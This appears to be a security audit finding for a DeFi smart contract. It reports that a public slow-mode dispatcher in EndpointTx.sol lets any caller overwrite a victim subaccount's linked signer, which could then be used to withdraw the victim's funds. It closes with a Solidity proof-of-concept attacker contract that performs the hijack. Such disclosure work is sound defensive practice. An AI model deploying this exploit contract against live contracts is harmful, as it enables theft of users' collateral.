### Title
Unrestricted `processSlowModeTransactionImpl` Allows Any Caller to Hijack Arbitrary Subaccount Linked Signers — (`File: core/contracts/EndpointTx.sol`)

---

### Summary

`EndpointTx.processSlowModeTransactionImpl` is declared `public` with no access control. Its internal `validateSender` guard contains a bypass branch (`sender == address(this)`) that any external caller can satisfy by passing the `Endpoint` contract's own address as the `sender` argument. This lets an unprivileged attacker execute any slow-mode transaction type — including `LinkSigner` — against any registered victim subaccount without the victim's signature or consent.

---

### Finding Description

`processSlowModeTransactionImpl` is the core dispatcher for all slow-mode transaction types. It is intended to be called only by the `Endpoint` contract itself (which queues, charges a fee, and then calls this function). However, it is declared `public` with no `onlyEndpoint`, `onlyOwner`, or equivalent modifier:

```solidity
// core/contracts/EndpointTx.sol line 202-205
function processSlowModeTransactionImpl(
    address sender,
    bytes calldata transaction
) public {
``` [1](#0-0) 

The `sender` parameter is fully attacker-controlled. Inside the function, per-transaction authorization is delegated to `validateSender`:

```solidity
// core/contracts/EndpointTx.sol line 17-23
function validateSender(bytes32 txSender, address sender) internal view {
    require(
        address(uint160(bytes20(txSender))) == sender ||
            sender == address(this),
        ERR_SLOW_MODE_WRONG_SENDER
    );
}
``` [2](#0-1) 

The second branch — `sender == address(this)` — is intended to allow the contract to process its own queued transactions. Because `processSlowModeTransactionImpl` is `public`, an attacker can pass `sender = address(endpoint)` directly. When the function executes (via delegatecall from `Endpoint`, so `address(this)` == `address(endpoint)`), the condition `sender == address(this)` evaluates to `true`, and `validateSender` passes for **any** `txn.sender` value the attacker supplies.

The `LinkSigner` slow-mode path then executes without any further ownership check:

```solidity
// core/contracts/EndpointTx.sol line 232-239
} else if (txType == IEndpoint.TransactionType.LinkSigner) {
    IEndpoint.LinkSigner memory txn = abi.decode(
        transaction[1:],
        (IEndpoint.LinkSigner)
    );
    validateSender(txn.sender, sender);          // bypassed as shown above
    requireSubaccount(txn.sender);               // passes for any deposited victim
    linkedSigners[txn.sender] = address(uint160(bytes20(txn.signer)));
``` [3](#0-2) 

The attacker sets `txn.signer` to their own address, permanently overwriting `linkedSigners[victim_subaccount]`.

`linkedSigners` is then consulted by `getLinkedSigner`, which is used in every `validateSignedTx` call to allow the linked signer to act on behalf of the subaccount owner:

```solidity
// core/contracts/EndpointTx.sol line 143-157
function getLinkedSigner(bytes32 subaccount)
    public view virtual returns (address)
{
    return
        RiskHelper.isIsolatedSubaccount(subaccount)
            ? linkedSigners[...]
            : linkedSigners[subaccount];
}
``` [4](#0-3) 

Once the attacker's address is the linked signer, they can sign and submit any fast-path transaction (trades, withdrawals, transfers) on behalf of the victim.

---

### Impact Explanation

An unprivileged attacker can:

1. Overwrite `linkedSigners[victim_subaccount]` with their own address for any registered subaccount.
2. Use that linked-signer status to sign `WithdrawCollateral`, `TransferQuote`, or order transactions on behalf of the victim.
3. Drain the victim's collateral balances entirely.

This is a direct, irreversible theft of user funds. The `linkedSigners` mapping is the sole authorization gate for fast-path transactions; corrupting it gives the attacker full account control.

---

### Likelihood Explanation

- No privileged access is required. Any EOA can call `processSlowModeTransactionImpl` directly on the `Endpoint` contract.
- The only precondition is that the victim subaccount is registered (i.e., has made at least one deposit), which is true for every active user.
- The attack requires a single transaction and costs only gas.
- The bypass is deterministic: `sender = address(endpoint)` always satisfies `sender == address(this)`.

---

### Recommendation

Restrict `processSlowModeTransactionImpl` so it can only be called by the `Endpoint` contract itself. The simplest fix is to change the visibility from `public` to `internal`, or add an explicit caller check:

```solidity
function processSlowModeTransactionImpl(
    address sender,
    bytes calldata transaction
) public {
    require(msg.sender == address(this), ERR_UNAUTHORIZED); // add this
    ...
}
```

Alternatively, remove the `sender == address(this)` branch from `validateSender` entirely and rely solely on the `address(uint160(bytes20(txSender))) == sender` check, which correctly ties the transaction payload to the actual caller.

---

### Proof of Concept

```solidity
// Attacker contract — no privileged keys required
contract AttackLinkedSigner {
    IEndpoint endpoint;

    constructor(address _endpoint) {
        endpoint = IEndpoint(_endpoint);
    }

    function hijack(bytes32 victimSubaccount) external {
        // Encode a LinkSigner slow-mode transaction
        // txn.sender = victim, txn.signer = attacker (packed into bytes32)
        IEndpoint.LinkSigner memory lsTx = IEndpoint.LinkSigner({
            sender: victimSubaccount,
            signer: bytes32(uint256(uint160(address(this)))),
            nonce: 0  // nonce not validated in slow-mode path
        });
        bytes memory transaction = abi.encodePacked(
            uint8(IEndpoint.TransactionType.LinkSigner),
            abi.encode(lsTx)
        );

        // Pass sender = address(endpoint) to satisfy `sender == address(this)`
        // inside validateSender, bypassing all ownership checks.
        IEndpointTx(address(endpoint)).processSlowModeTransactionImpl(
            address(endpoint),
            transaction
        );
        // linkedSigners[victimSubaccount] is now address(this)
        // Attacker can now sign withdrawals / trades on behalf of victim
    }
}
```

### Citations

**File:** core/contracts/EndpointTx.sol (L17-23)
```text
    function validateSender(bytes32 txSender, address sender) internal view {
        require(
            address(uint160(bytes20(txSender))) == sender ||
                sender == address(this),
            ERR_SLOW_MODE_WRONG_SENDER
        );
    }
```

**File:** core/contracts/EndpointTx.sol (L143-157)
```text
    function getLinkedSigner(bytes32 subaccount)
        public
        view
        virtual
        returns (address)
    {
        return
            RiskHelper.isIsolatedSubaccount(subaccount)
                ? linkedSigners[
                    IOffchainExchange(offchainExchange).getParentSubaccount(
                        subaccount
                    )
                ]
                : linkedSigners[subaccount];
    }
```

**File:** core/contracts/EndpointTx.sol (L202-205)
```text
    function processSlowModeTransactionImpl(
        address sender,
        bytes calldata transaction
    ) public {
```

**File:** core/contracts/EndpointTx.sol (L232-239)
```text
        } else if (txType == IEndpoint.TransactionType.LinkSigner) {
            IEndpoint.LinkSigner memory txn = abi.decode(
                transaction[1:],
                (IEndpoint.LinkSigner)
            );
            validateSender(txn.sender, sender);
            requireSubaccount(txn.sender);
            linkedSigners[txn.sender] = address(uint160(bytes20(txn.signer)));
```
